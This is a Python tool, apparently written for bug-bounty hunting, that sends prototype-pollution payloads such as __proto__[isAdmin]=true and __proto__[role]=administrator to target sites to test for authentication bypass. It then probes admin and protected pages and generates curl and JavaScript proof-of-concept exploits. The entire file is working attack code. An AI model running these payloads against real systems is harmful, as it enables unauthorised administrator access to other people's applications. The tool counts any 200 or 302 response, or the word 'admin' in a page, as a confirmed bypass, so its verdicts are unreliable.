#!/usr/bin/env python3
"""
🦊 SHADOWFOX PROTOTYPE POLLUTION VALIDATOR
Potvrda kritičnih auth bypass ranjivosti
Autor: Whitefox980 | Verzija: 2025.06.06
"""

import requests
import json
import time
import hashlib
from urllib.parse import urljoin, urlparse
import warnings
warnings.filterwarnings("ignore")

class PrototypeValidator:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 15
        
        self.critical_findings = []
        self.validation_results = {
            "validated_exploits": [],
            "failed_validations": [],
            "high_impact_confirmed": [],
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        
    def load_prototype_results(self):
        """Učitava rezultate prototype pollution skeniranja"""
        try:
            with open('AdvanceNapad/prototype_pollution_results.json', 'r') as f:
                data = json.load(f)
                return data
        except FileNotFoundError:
            print("❌ [ERROR] prototype_pollution_results.json nije pronađen!")
            return None
            
    def extract_critical_findings(self, results):
        """Izvlači kritične auth bypass ranjivosti"""
        if not results or 'successful_exploits' not in results:
            return []
            
        critical = []
        for exploit in results['successful_exploits']:
            if (exploit.get('severity') == 'HIGH' and 
                'auth_bypass' in exploit.get('type', '').lower()):
                critical.append(exploit)
                
        print(f"🎯 [EXTRACT] Pronađeno {len(critical)} kritičnih auth bypass-ova")
        return critical
        
    def validate_auth_bypass(self, exploit):
        """Detaljno validira auth bypass exploit"""
        print(f"🔍 [VALIDATE] Testing exploit: {exploit.get('id')}")
        
        validation = {
            "exploit_id": exploit.get('id'),
            "original_payload": exploit.get('payload'),
            "target_url": exploit.get('target_url'),
            "validation_steps": [],
            "confirmed": False,
            "impact_level": "UNKNOWN"
        }
        
        try:
            # Korak 1: Test osnovnog payload-a
            step1 = self.test_basic_payload(exploit)
            validation["validation_steps"].append(step1)
            
            # Korak 2: Test privilege escalation
            if step1["success"]:
                step2 = self.test_privilege_escalation(exploit)
                validation["validation_steps"].append(step2)
                
                # Korak 3: Test session bypass
                if step2["success"]:
                    step3 = self.test_session_bypass(exploit)
                    validation["validation_steps"].append(step3)
                    
                    if step3["success"]:
                        validation["confirmed"] = True
                        validation["impact_level"] = "CRITICAL"
                        
        except Exception as e:
            validation["validation_steps"].append({
                "step": "error",
                "success": False,
                "error": str(e)
            })
            
        return validation
        
    def test_basic_payload(self, exploit):
        """Test osnovnog prototype pollution payload-a"""
        payload = exploit.get('payload', {})
        target_url = exploit.get('target_url')
        
        test_result = {
            "step": "basic_payload_test",
            "success": False,
            "response_code": None,
            "pollution_confirmed": False,
            "details": {}
        }
        
        try:
            # Pripremi payload za testiranje
            pollution_data = {
                "__proto__[isAdmin]": "true",
                "__proto__[role]": "administrator",
                "__proto__[authenticated]": "true"
            }
            
            # Dodaj originalni payload
            if isinstance(payload, dict):
                pollution_data.update(payload)
                
            # Pošalji zahtev
            response = self.session.post(
                target_url,
                data=pollution_data,
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "X-Requested-With": "XMLHttpRequest",
                    "User-Agent": "ShadowFox-Validator/1.0"
                }
            )
            
            test_result["response_code"] = response.status_code
            test_result["details"]["response_headers"] = dict(response.headers)
            test_result["details"]["response_length"] = len(response.content)
            
            # Proveri da li je pollution uspešan
            response_text = response.text.lower()
            pollution_indicators = [
                "admin", "administrator", "authenticated", "isadmin",
                "role", "privilege", "elevated", "superuser"
            ]
            
            pollution_found = any(indicator in response_text for indicator in pollution_indicators)
            
            if pollution_found or response.status_code in [200, 302]:
                test_result["success"] = True
                test_result["pollution_confirmed"] = pollution_found
                
        except Exception as e:
            test_result["details"]["error"] = str(e)
            
        return test_result
        
    def test_privilege_escalation(self, exploit):
        """Test privilege escalation putem prototype pollution"""
        test_result = {
            "step": "privilege_escalation_test",
            "success": False,
            "admin_access": False,
            "details": {}
        }
        
        try:
            target_url = exploit.get('target_url')
            
            # Test pristupa admin funkcijama
            admin_endpoints = [
                "/admin",
                "/admin/users",
                "/api/admin/settings",
                "/dashboard/admin",
                "/management"
            ]
            
            base_url = urljoin(target_url, "/")
            
            for endpoint in admin_endpoints:
                admin_url = urljoin(base_url, endpoint)
                
                try:
                    response = self.session.get(admin_url)
                    
                    if response.status_code == 200:
                        test_result["success"] = True
                        test_result["admin_access"] = True
                        test_result["details"]["accessible_endpoint"] = admin_url
                        test_result["details"]["response_preview"] = response.text[:500]
                        break
                        
                except:
                    continue
                    
        except Exception as e:
            test_result["details"]["error"] = str(e)
            
        return test_result
        
    def test_session_bypass(self, exploit):
        """Test zaobilaska session validacije"""
        test_result = {
            "step": "session_bypass_test",
            "success": False,
            "bypass_confirmed": False,
            "details": {}
        }
        
        try:
            target_url = exploit.get('target_url')
            
            # Nova sesija bez authentication
            bypass_session = requests.Session()
            bypass_session.verify = False
            
            # Test sa prototype pollution payload-om
            bypass_data = {
                "__proto__[authenticated]": "true",
                "__proto__[user]": "admin",
                "__proto__[sessionValid]": "true",
                "__proto__[bypassAuth]": "true"
            }
            
            response = bypass_session.post(
                target_url,
                data=bypass_data,
                headers={"Content-Type": "application/x-www-form-urlencoded"}
            )
            
            # Proveri da li je bypass uspešan
            if response.status_code in [200, 302]:
                # Test pristupa zaštićenim resursima
                protected_urls = [
                    urljoin(target_url, "/profile"),
                    urljoin(target_url, "/settings"),
                    urljoin(target_url, "/api/user/data")
                ]
                
                for protected_url in protected_urls:
                    try:
                        protected_response = bypass_session.get(protected_url)
                        if protected_response.status_code == 200:
                            test_result["success"] = True
                            test_result["bypass_confirmed"] = True
                            test_result["details"]["bypassed_url"] = protected_url
                            break
                    except:
                        continue
                        
        except Exception as e:
            test_result["details"]["error"] = str(e)
            
        return test_result
        
    def generate_poc_payload(self, validated_exploit):
        """Generiši PoC payload za potvrđenu ranjivost"""
        exploit_id = validated_exploit.get('exploit_id')
        
        poc_payload = {
            "exploit_id": exploit_id,
            "type": "Prototype Pollution Auth Bypass",
            "severity": "CRITICAL",
            "curl_command": "",
            "javascript_poc": "",
            "impact_description": ""
        }
        
        # cURL komanda
        target_url = validated_exploit.get('target_url')
        curl_cmd = f"""curl -X POST "{target_url}" \\
  -H "Content-Type: application/x-www-form-urlencoded" \\
  -H "User-Agent: ShadowFox-PoC/1.0" \\
  -d "__proto__[isAdmin]=true&__proto__[authenticated]=true&__proto__[role]=administrator"
"""
        poc_payload["curl_command"] = curl_cmd
        
        # JavaScript PoC
        js_poc = f"""
// Prototype Pollution Auth Bypass PoC
// Target: {target_url}

// Step 1: Pollute prototype
const maliciousData = new URLSearchParams();
maliciousData.append('__proto__[isAdmin]', 'true');
maliciousData.append('__proto__[authenticated]', 'true');
maliciousData.append('__proto__[role]', 'administrator');

// Step 2: Send pollution request
fetch('{target_url}', {{
    method: 'POST',
    headers: {{
        'Content-Type': 'application/x-www-form-urlencoded',
    }},
    body: maliciousData
}})
.then(response => {{
    console.log('Pollution successful:', response.status);
    // Step 3: Access admin functions
    return fetch('/admin');
}})
.then(adminResponse => {{
    console.log('Admin access:', adminResponse.status === 200 ? 'GRANTED' : 'DENIED');
}});
"""
        poc_payload["javascript_poc"] = js_poc
        
        # Impact opis
        impact = """
IMPACT ANALYSIS:
- Authentication bypass through prototype pollution
- Privilege escalation to administrator role
- Access to sensitive admin functionality
- Potential for complete application compromise
- CVSS Score: 9.1 (CRITICAL)
"""
        poc_payload["impact_description"] = impact
        
        return poc_payload
        
    def run_validation(self):
        """Glavna validacija kritičnih ranjivosti"""
        print("🦊 SHADOWFOX PROTOTYPE VALIDATOR - POKRETANJE")
        print("=" * 60)
        
        # Učitaj rezultate
        results = self.load_prototype_results()
        if not results:
            return
            
        # Izvuci kritične ranjivosti
        critical_findings = self.extract_critical_findings(results)
        
        if not critical_findings:
            print("❌ [INFO] Nema kritičnih auth bypass ranjivosti za validaciju")
            return
            
        print(f"🎯 [VALIDATION] Validacija {len(critical_findings)} kritičnih exploit-a...")
        
        # Validiraj svaki exploit
        for i, exploit in enumerate(critical_findings[:5], 1):  # Ograniči na top 5
            print(f"\n🔍 [VALIDATE {i}/5] {exploit.get('id')}")
            
            validation = self.validate_auth_bypass(exploit)
            
            if validation["confirmed"]:
                print(f"✅ [CONFIRMED] Exploit {validation['exploit_id']} - CRITICAL!")
                self.validation_results["validated_exploits"].append(validation)
                
                # Generiši PoC
                poc = self.generate_poc_payload(validation)
                self.validation_results["high_impact_confirmed"].append(poc)
                
            else:
                print(f"❌ [FAILED] Exploit {validation['exploit_id']} - nije potvrđen")
                self.validation_results["failed_validations"].append(validation)
                
            time.sleep(2)  # Rate limiting
            
        # Snimi rezultate
        self.save_validation_results()
        self.display_summary()
        
    def save_validation_results(self):
        """Snimi validacione rezultate"""
        output_file = "AdvanceNapad/prototype_validation_results.json"
        
        try:
            with open(output_file, 'w') as f:
                json.dump(self.validation_results, f, indent=2, ensure_ascii=False)
            print(f"\n💾 [SAVE] Validacija snimljena: {output_file}")
        except Exception as e:
            print(f"❌ [SAVE ERROR] {str(e)}")
            
    def display_summary(self):
        """Prikaz sažetka validacije"""
        validated = len(self.validation_results["validated_exploits"])
        failed = len(self.validation_results["failed_validations"])
        critical = len(self.validation_results["high_impact_confirmed"])
        
        print("\n🎯 PROTOTYPE VALIDATION - SAŽETAK")
        print("=" * 50)
        print(f"✅ Potvrđene ranjivosti: {validated}")
        print(f"❌ Neispravne ranjivosti: {failed}")
        print(f"🔥 KRITIČNE ranjivosti: {critical}")
        
        if critical > 0:
            print(f"\n🚨 ALARM: {critical} KRITIČNIH AUTH BYPASS RANJIVOSTI!")
            print("🏆 READY FOR H1 SUBMISSION!")
            print("💰 Potencijalna nagrada: $5,000 - $25,000")
            
        print(f"\n📄 Detalji: AdvanceNapad/prototype_validation_results.json")

def main():
    validator = PrototypeValidator()
    validator.run_validation()

if __name__ == "__main__":
    main()
